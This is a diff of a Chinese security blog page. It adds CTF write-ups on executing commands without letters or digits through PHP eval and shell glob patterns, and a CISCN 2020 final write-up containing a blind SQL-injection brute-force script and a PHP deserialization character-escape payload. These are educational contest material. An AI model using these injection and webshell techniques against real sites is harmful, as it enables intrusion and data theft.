@@ -198,6 +198,149 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/b7770c5dc9b5b.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/header.jpg">
+      <meta itemprop="name" content="XiaoLeung">
+      <meta itemprop="description" content="随笔、分享、记录生活">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Xiao Leung's Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/articles/b7770c5dc9b5b.html" class="post-title-link" itemprop="url">《无字母数字webshell之提高篇》读书笔记</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2020-10-22 19:13:18 / 修改时间：19:28:40" itemprop="dateCreated datePublished" datetime="2020-10-22T19:13:18+08:00">2020-10-22</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.6k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
+<li>前几天曾经教过的学员给我甩来了这么一道题。虽然想出了用通配符做，但是没有实际做出来，总的来说就是对无字母的webshell学习不够仔细，限于做出一道CTF题目为止的，蜻蜓点水的状态。</li>
+</ul>
+<h3 id="题目解决流程"><a href="#题目解决流程" class="headerlink" title="题目解决流程"></a>题目解决流程</h3><h4 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h4><pre><code class="php"> &lt;?php
+if(isset($_GET[&#39;evil&#39;])){
+    if(strlen($_GET[&#39;evil&#39;])&gt;25||preg_match(&quot;/[\w$=()&lt;&gt;&#39;\&quot;]/&quot;, $_GET[&#39;evil&#39;])){
+        die(&quot;danger!!&quot;);
+    }
+    @eval($_GET[&#39;evil&#39;]);
+}
+highlight_file(__FILE__);
+?&gt;</code></pre>
+<h4 id="单个字符的Fuzz"><a href="#单个字符的Fuzz" class="headerlink" title="单个字符的Fuzz"></a>单个字符的Fuzz</h4><ul>
+<li>题目主要是过滤了单个字符，这种Fuzz能够快速得知我们还有哪些字符能够用。编写一个脚本：</li>
+</ul>
+<pre><code class="php">&lt;?php
+for ($ascii = 0; $ascii &lt; 256; $ascii++) {
+    if (!preg_match(&quot;/[\w$=()&lt;&gt;&#39;\&quot;]/&quot;, chr($ascii))) {
+        echo (chr($ascii));
+    }
+}
+?&gt;
+//运行结果
+// !#%&amp;*+,-./:;?@[\]^`{|}~��������������������������������������������������������������������������������������������������������������������������������[Finished in 0.3s]
+</code></pre>
+<ul>
+<li>可以快速地看到，我们呢广告用 的只有(!#%&amp;*+,-./:;?@[]^`{|}~),这里$,()都已经被过滤，不论是取反、异或、或运算、位运算都是通过动态拼接函数来实现执行任意代码的。这里还不能使用可见的字符，使用require来包含flag也是不可能实现的。这里还能用的就是反引号了。我们知道反引号能执行shell,它本质就是调用shell_exec,这个函数执行的shell是不会有回显的，就算catflag也不会显示出来。做到这里基本就没有思路了。</li>
+</ul>
+<h4 id="有趣的Linux-shell"><a href="#有趣的Linux-shell" class="headerlink" title="有趣的Linux shell"></a>有趣的Linux shell</h4><ul>
+<li>回看P神的<code>《无字母数字webshell之提高篇》</code> ，可以 知道这么两个有趣的shell知识点：</li>
+</ul>
+<blockquote>
+<p>1.shell下可以利用<code>.</code>来执行任意脚本</p>
+<p>2.Linux文件名支持用glob通配符代替</p>
+</blockquote>
+<p><img src="/Users/gqleung/picture/WX20201015-090013@2x.png" alt="WX20201015-090013@2x"></p>
+<ul>
+<li>但是我们用通配符来执行这个SB脚本的时候却会报错：</li>
+</ul>
+<p><img src="/Users/gqleung/picture/WX20201015-090353@2x.png" alt="WX20201015-090353@2x"></p>
+<ul>
+<li>这说明我们能够匹配上<code>??</code>的文件或者目录很多，我们直接列出来看看</li>
+</ul>
+<p><img src="/Users/gqleung/picture/WX20201015-093749@2x.png" alt="WX20201015-093749@2x"></p>
+<ul>
+<li>这说明两个字符的文件还是有很多的，我们必须匹配上我们唯一的文件才有可能直线我们想要直接的代码。</li>
+</ul>
+<h5 id="有趣的glob通配符"><a href="#有趣的glob通配符" class="headerlink" title="有趣的glob通配符"></a>有趣的glob通配符</h5><ul>
+<li>我们都认识<code>*?</code>这两个通配符，其实在glob语法里面还支持类似于正则表达式的语法。例如<code>[^S]</code>就是排除掉S字母,我们可以排除掉S字母然后再列目录看看，就会发现SB这个文件被排除在外。</li>
+</ul>
+<p><img src="/Users/gqleung/picture/WX20201015-094327@2x.png" alt="WX20201015-094327@2x"></p>
+<ul>
+<li>但是这里我们的要求是不能有字母数字，我们刚才说了glob是支持类似正则表达式的用法，如<code>[0-9]</code>,是支持的，那么我们在aiisc表中找出两个包含大写字母之间的字符就行了这样我们就能够成功获取到SB文件。</li>
+</ul>
+<p><img src="/Users/gqleung/picture/aiisc.png" alt="aiisc"></p>
+<ul>
+<li>从AIISC表中我们可以知道，<code>@-[</code>是在大写字母之间的，那么我构造<code>[@-[]?</code>是不是能够匹配到SB了呢？答案是肯定的。</li>
+</ul>
+<p><img src="/Users/gqleung/picture/WX20201015-145223@2x.png" alt="WX20201015-145223@2x"></p>
+<ul>
+<li>其实我们PHP在接受上传表单的文件流后会将文件保存到<code>/tmp</code>文件夹中，不论后端是否有编写上传的代码。而这个文件类似于这样的命名方式：<code>/tmp/phpXXXXXX</code>.</li>
+</ul>
+<p><img src="/Users/gqleung/picture/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png" alt="67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c"></p>
+<ul>
+<li>和上面讨论的一样，这样匹配出来的回匹配到很多文件，我哦们可以看到后面两位或者一位可能是大写这样我们就可以用<code>.+/???/????????[@-[]</code>来匹配执行文件。</li>
+</ul>
+<p><img src="/Users/gqleung/picture/WX20201015-212645@2x.png" alt="WX20201015-212645@2x"></p>
+<ul>
+<li>直接getflag</li>
+</ul>
+<p><img src="/Users/gqleung/picture/WX20201015-212949@2x.png" alt="WX20201015-212949@2x"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/a882b8c55b5a7.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -615,7 +758,7 @@ echo $open_php;
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/d611bed02b.html">
+    <link itemprop="mainEntityOfPage" href="https://www.plasf.cn/articles/159ab5557e.html">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/header.jpg">
@@ -629,7 +772,7 @@ echo $open_php;
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/articles/d611bed02b.html" class="post-title-link" itemprop="url">西湖论剑Easyjson Write up</a>
+            <a href="/articles/159ab5557e.html" class="post-title-link" itemprop="url">CISCN 2020 FINAL 部分Write Up</a>
         </h2>
 
         <div class="post-meta">
@@ -646,7 +789,7 @@ echo $open_php;
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-10-14 17:04:36" itemprop="dateModified" datetime="2020-10-14T17:04:36+08:00">2020-10-14</time>
+                <time title="修改时间：2020-10-14 17:05:08" itemprop="dateModified" datetime="2020-10-14T17:05:08+08:00">2020-10-14</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -654,7 +797,7 @@ echo $open_php;
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/CTF比赛/" itemprop="url" rel="index"><span itemprop="name">CTF比赛</span></a>
+                  <a href="/categories/全国大学生信息安全竞赛/" itemprop="url" rel="index"><span itemprop="name">全国大学生信息安全竞赛</span></a>
                 </span>
             </span>
 
@@ -664,14 +807,14 @@ echo $open_php;
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>3.6k</span>
+              <span>10k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>3 分钟</span>
+              <span>9 分钟</span>
             </span>
 
         </div>
@@ -683,142 +826,144 @@ echo $open_php;
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
-<p>太菜了只做了一道</p>
-</blockquote>
-<h2 id="Easyjson"><a href="#Easyjson" class="headerlink" title="Easyjson"></a>Easyjson</h2><ul>
-<li>代码审计</li>
+          <h2 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h2><ul>
+<li>右键看源码有提示：SQL语句中两个变量可以控制。</li>
+<li>同时可以得知真正的flag在<code>real_flag</code>的<code>flag</code>字段中</li>
 </ul>
-<pre><code class="php"> &lt;?php
-include &#39;security.php&#39;;
-
-if(!isset($_GET[&#39;source&#39;])){
-    show_source(__FILE__);
-    die();
-}
-$sandbox = &#39;sandbox/&#39;.sha1($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]).&#39;/&#39;;
-var_dump($sandbox);
-if(!file_exists($sandbox)){
-    mkdir($sandbox);
-    file_put_contents($sandbox.&quot;index.php&quot;,&quot;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&quot;);
-}
-$action = $_GET[&#39;action&#39;];
-$content = file_get_contents(&quot;php://input&quot;);
-
-
-if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
-    $content = json_decode($content);
-    $filename = $_GET[&#39;filename&#39;];
-    $filecontent = $content-&gt;content;
-    $filename = $sandbox.$filename;
-    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
-}elseif($action == &quot;reset&quot;){
-    $files = scandir($sandbox);
-    foreach($files as $file) {
-        if(!is_dir($file)){
-            if($file !== &quot;index.php&quot;){
-                unlink($sandbox.$file);
-            }
-        }
-    }
-}
-else{
-    die(&#39;Security Check Failed.&#39;);
-}
-</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/blog/ciscn_final_1.png" alt="ciscn_final_1"></p>
 <ul>
-<li>代码主要部分在,但是这里有一个waf对文件名和content参数进行过滤。简单Fuzz了一下，filename可以使用php后缀，说明可以写php文件，但是有一个很关键的问题就是<code>content</code>它传来必须是一个json,json中有一个属性是content，例如：<code>{&#39;content&#39;:&#39;&lt;?=phpinfo()?&gt;&#39;}</code>但是<code>waf</code>对json进行了过滤，不能存在content这个字符串(还过滤了其他关键字)。</li>
+<li>手动fuzz发现两边过滤的字符是不一样的。过滤了很多，在测试时候发现select语句是没有被过滤的，但是union是被过滤了。</li>
+<li>id能用的有减号、<code>/*</code>、<code>or</code></li>
+<li>limit能用的有括弧、<code>*/</code></li>
+<li>这就很明显了。/**/正好可以注释掉limit</li>
+<li>然后用select查询出flag，将flag切片转换为aiisc码，然后用数字与之相减，如果相减得到0那就是Ture</li>
+<li>先构造大概原理的伪代码</li>
 </ul>
-<pre><code class="php">if($action == &quot;write&quot; &amp;&amp;  SecurityCheck(&#39;filename&#39;,$_GET[&#39;filename&#39;]) &amp;&amp;SecurityCheck(&#39;content&#39;,$content)){
-    $content = json_decode($content);
-    $filename = $_GET[&#39;filename&#39;];
-    $filecontent = $content-&gt;content;
-    $filename = $sandbox.$filename;
-    file_put_contents($filename,$filecontent.&quot;\n Powered By Dbapp OSS.&quot;);
-}</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001234@2x.png" alt="WX20201009-001234@2x"></p>
+<pre><code class="sql">SELECT * FROM fake_flag WHERE id = 3 or 102-/* limit 0,1*/ ord(mid((select group_concat(flag)from real_flag),1,1))</code></pre>
 <ul>
-<li>神小密圈发现，json支持的字符中可以支持unicode编码，那么我们全都用unicode编码来代替字符串不就行了？</li>
+<li><p>这里有个问题就是过滤了空格。</p>
+</li>
+<li><p>空格可以直接用<code>\t</code>来代替</p>
+</li>
+<li><p>功能逗号被过滤用<code>from....for</code>来代替</p>
+</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG59.jpeg" alt="WechatIMG59"></p>
+<pre><code class="sql">SELECT * FROM fake_flag WHERE id = 3 or 102- /* limit 0,1*/ord(mid((select group_concat(flag)from real_flag)from(1)for(1)))</code></pre>
 <ul>
-<li>简单测试一下发现可以.<a href="https://blog.csdn.net/weixin_30654419/article/details/97554779?utm_medium=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-BlogCommendFromMachineLearnPai2-1.channel_param" target="_blank" rel="noopener">Unicode表</a></li>
+<li>脚本</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WechatIMG72.png" alt="WechatIMG72"></p>
+<pre><code class="python">import requests
+
+flag = &quot;&quot;
+url = &quot;http://www.ctf.com/&quot;
+tables = r&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789{}_-&quot;
+for j in range(1,40):
+    for i in tables:
+        payload=&quot;?id=3%%09or%%09%d-/*&amp;limit=10%%09and*/ord(mid((select%%09group_concat(flag)%%09from%%09real_flag)from(%d)for(1)))&quot;%(ord(i),j)
+        #print(payload)
+        r = requests.get(url+payload)
+        if &quot;searched nothing&quot; in r.text:
+            flag=flag+i
+            print(flag)
+            break</code></pre>
+<p><img src="http://goodcheerleung.gitee.io/blog/ciscn_final_2.png" alt="ciscn_final_2"></p>
+<h2 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h2><ul>
+<li>国际惯例扫描一下，得到备份源码</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-210800@2x.png" alt="WX20201007-210800@2x"></p>
 <ul>
-<li>简单写个脚本来将字符串转化为unicode编码。</li>
+<li>简单看一下源码，在<code>lib.php</code>存在一个反序列化点。</li>
 </ul>
-<pre><code class="php">&lt;?php
-
-function unicode_encode($str){
-    $table = [
-            &#39;\u002&#39;=&gt;[&#39; &#39;,&#39;!&#39;,&#39;&quot;&#39;,&#39;#&#39;,&#39;$&#39;,&#39;%&#39;,&#39;&amp;&#39;,&#39;\&#39;&#39;,&#39;(&#39;,&#39;)&#39;,&#39;*&#39;,&#39;+&#39;,&#39;,&#39;,&#39;-&#39;,&#39;.&#39;,&#39;/&#39;],
-            &#39;\u003&#39;=&gt;[&#39;0&#39;,&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;,&#39;5&#39;,&#39;6&#39;,&#39;7&#39;,&#39;8&#39;,&#39;9&#39;,&#39;:&#39;,&#39;;&#39;,&#39;&lt;&#39;,&#39;=&#39;,&#39;&gt;&#39;,&#39;?&#39;],
-            &#39;\u004&#39;=&gt;[&#39;@&#39;,&#39;A&#39;,&#39;B&#39;,&#39;C&#39;,&#39;D&#39;,&#39;E&#39;,&#39;F&#39;,&#39;G&#39;,&#39;H&#39;,&#39;I&#39;,&#39;J&#39;,&#39;K&#39;,&#39;L&#39;,&#39;M&#39;,&#39;N&#39;,&#39;O&#39;],
-            &#39;\u005&#39;=&gt;[&#39;P&#39;,&#39;Q&#39;,&#39;R&#39;,&#39;S&#39;,&#39;T&#39;,&#39;U&#39;,&#39;V&#39;,&#39;W&#39;,&#39;X&#39;,&#39;Y&#39;,&#39;Z&#39;,&#39;[&#39;,&#39;\\&#39;,&#39;]&#39;,&#39;^&#39;,&#39;_&#39;],
-            &#39;\u006&#39;=&gt;[&#39;`&#39;,&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;,&#39;h&#39;,&#39;i&#39;,&#39;j&#39;,&#39;k&#39;,&#39;l&#39;,&#39;m&#39;,&#39;n&#39;,&#39;o&#39;],
-            &#39;\u007&#39;=&gt;[&#39;p&#39;,&#39;q&#39;,&#39;r&#39;,&#39;s&#39;,&#39;t&#39;,&#39;u&#39;,&#39;v&#39;,&#39;w&#39;,&#39;x&#39;,&#39;y&#39;,&#39;z&#39;,&#39;{&#39;,&#39;|&#39;,&#39;}&#39;,&#39;~&#39;]
-];
-    foreach ($table as $key =&gt; $value) {
-        $i = 0;
-        foreach ($value as $vcode) {
-            $i=$i+1;
-            if($str==$vcode){
-                return $key.bin2e($i-1);
-            }
-
-        }
-    }
-
-}
-
-function bin2e($str){
-    switch ($str) {
-        case &#39;10&#39;:
-            return &#39;a&#39;;
-            break;
-        case &#39;11&#39;:
-            return &#39;b&#39;;
-            break;
-        case &#39;12&#39;:
-            return &#39;c&#39;;
-            break;
-        case &#39;13&#39;:
-            return &#39;d&#39;;
-            break;
-        case &#39;14&#39;:
-            return &#39;e&#39;;
-            break;
-        case &#39;15&#39;:
-            return &#39;f&#39;;
-            break;
-        default:
-            return $str;
-            break;
-    }
-}
-
-function main($str){
-for($i=0;$i&lt;strlen($str);$i++){
-    echo unicode_encode($str[$i]);
-}
-}
-
-
-main(&#39;&lt;?=phpinfo()?&gt;&#39;);
-?&gt;</code></pre>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000458@2x.png" alt="WX20201009-000458@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-205532@2x.png" alt="WX20201005-205532@2x"></p>
 <ul>
-<li>EXP</li>
+<li>全局搜索<code>update</code>查看哪里使用了这个方法，可以发现在<code>dashboard.php</code>存在调用<code>update</code>的情况。但是这里先是奖传入的内容赋值给一个数组，然后再进行序列化，传入一个<code>waf</code>对传入的内容进行了替换。但是waf是将部分关键字进行替换，这里可以基本确定是考察反序列化的字符逃逸问题。</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000600@2x.png" alt="WX20201009-000600@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000806@2x.png" alt="WX20201009-000806@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-205428@2x.png" alt="WX20201005-205428@2x"></p>
+<ul>
+<li>从源码可以知道flag就是在<code>flag.php</code>我们的目标就是读到<code>flag.php</code>源码即可。整个类最明显调用的地方就是<code>_DESTRUCT()</code>可以读取文件。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-210603@2x.png" alt="WX20201005-210603@2x"></p>
+<ul>
+<li>这样目标就很明显了，我们需要控制<code>avatar</code>属性为<code>flag.php</code>,但是这里存在一个问题，就是waf是过滤了<code>flag</code>这个关键字，我们知道在遇到私有属性可以将小s改成S通过十六进制来代替不可见字符，同样我们可以通过十六进制来表示<code>flag.php</code>，这样就能轻松绕过waf的过滤，但是waf还有一个用处就是用来字符逃逸</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201005-213527@2x.png" alt="WX20201005-213433@2x"></p>
+<ul>
+<li>waf可以将flag替换为index,这样我们替换一个flag能够逃逸一个字符。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-205541@2x.png" alt="WX20201007-205541@2x"></p>
+<ul>
+<li>由于我们能够控制的是序列化后的一个数组，所以我们要逃逸的是这么一个对象,<code>&quot;;s:1:&quot;1&quot;;</code>单引号是为了闭合前面制造逃逸的字符串，<code>;s:1:&quot;1&quot;;</code>是为了给数组增加一个元素，他的值是一个对象。</li>
+</ul>
+<pre><code class="php">&quot;;s:1:&quot;1&quot;;O:4:&quot;User&quot;:6:{S:8:&quot;username&quot;;S:1:&quot;1&quot;;S:8:&quot;password&quot;;S:1:&quot;1&quot;;S:3:&quot;age&quot;;S:1:&quot;1&quot;;S:5:&quot;email&quot;;S:1:&quot;1&quot;;S:12:&quot;\00User\00avatar&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;S:13:&quot;\00User\00content&quot;;S:0:&quot;&quot;;}</code></pre>
+<ul>
+<li>而上面的字符串长度为196，所以我们需要196个flag来制造逃逸。</li>
+</ul>
+<pre><code class="php">flagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflagflag&quot;;s:1:&quot;1&quot;;O:4:&quot;User&quot;:6:{S:8:&quot;username&quot;;S:1:&quot;1&quot;;S:8:&quot;password&quot;;S:1:&quot;1&quot;;S:3:&quot;age&quot;;S:1:&quot;1&quot;;S:5:&quot;email&quot;;S:1:&quot;1&quot;;S:12:&quot;\00User\00avatar&quot;;S:8:&quot;\66\6C\61\67\2E\70\68\70&quot;;S:13:&quot;\00User\00content&quot;;S:0:&quot;&quot;;}</code></pre>
+<ul>
+<li>这里有一个问题就是我们只能用<code>old_password</code>来逃逸，因为<code>dashboard.php</code>对其他参数进行了过滤，但是<code>old_password</code>没有进行过滤。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-210152@2x.png" alt="WX20201007-210152@2x"></p>
 <ul>
 <li>Getflag</li>
 </ul>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001124@2x.png" alt="WX20201009-001124@2x"></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-001031@2x.png" alt></p>
-<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-000938@2x.png" alt="WX20201009-000938@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201007-211522@2x.png" alt="WX20201007-211522@2x"></p>
+<h2 id="MISC1"><a href="#MISC1" class="headerlink" title="MISC1"></a>MISC1</h2><ul>
+<li>题目给了一张损坏了的PNG图片，在第八个chunk，length长度为0，所以要计算chunk[8]的长度。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-085749@2x.png" alt="WX20201009-085749@2x"></p>
+<ul>
+<li>Chunk的长度是这个CHUNK IDAT到下一个IDAT的长度。</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090038@2x.png" alt="WX20201009-090038@2x"></p>
+<ul>
+<li>CP下来，写个脚本计算一下长度。</li>
+</ul>
+<pre><code class="php">&lt;?php
+$a = file_get_contents(&#39;1.txt&#39;);
+echo strlen($a);
+?&gt;</code></pre>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090153@2x.png" alt="WX20201009-090153@2x"></p>
+<ul>
+<li>修改长度为<code>21543</code>,这样就可以将图片修复为正常的图片，得到hint，apache</li>
+</ul>
+<p><img src="https://goodcheerleung.gitee.io/macpic/WX20201009-090304@2x.png" alt="WX20201009-090304@2x"></p>
+<p><img src="https://goodcheerleung.gitee.io/macpic/misc.png" alt="misc"></p>
+<ul>
+<li>在010编辑时候就发现，在图片的后面存在一串类似base64的东西。用万能的<code>strings</code>提取出来,去掉IDAT头</li>
+</ul>
+<pre><code>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